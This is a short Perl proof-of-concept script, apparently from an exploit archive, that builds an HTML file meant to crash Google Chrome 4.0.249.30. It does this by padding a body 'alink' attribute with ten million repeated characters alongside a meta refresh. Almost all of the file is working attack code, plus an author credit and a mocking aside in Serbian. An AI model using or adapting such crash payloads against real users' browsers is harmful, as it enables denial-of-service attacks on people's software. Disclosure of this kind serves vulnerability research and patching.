#!/usr/bin/perl
#google chrome 4.0.249.30 DoS PoC
#
#
#Author: Teo Manojlovic
#
#Info: In ordinary cases browser would redirect to "http://www.google.com" 
#but in this case browser will report error for something that should 
#be possible and is possible on other browsers.
#
#
#
#I would like to thank Jeremy Brown who made very nice fuzzer for browser
#
#
#
#
#
#
#
#Ipak lik nije tolika seljacina koliko sam mislio da je, jer mu pdf fuzzer malo suxa


$file="poc.html";
$poc='a/' x 10000000;
open(myfile,">>$file");
print myfile '<head><meta http-equiv="refresh" content="1; url=http://www.google.com"></head>';
print myfile "<body alink=";
print myfile $poc;
print myfile '">';
close(myfile);
print "Finished\n";
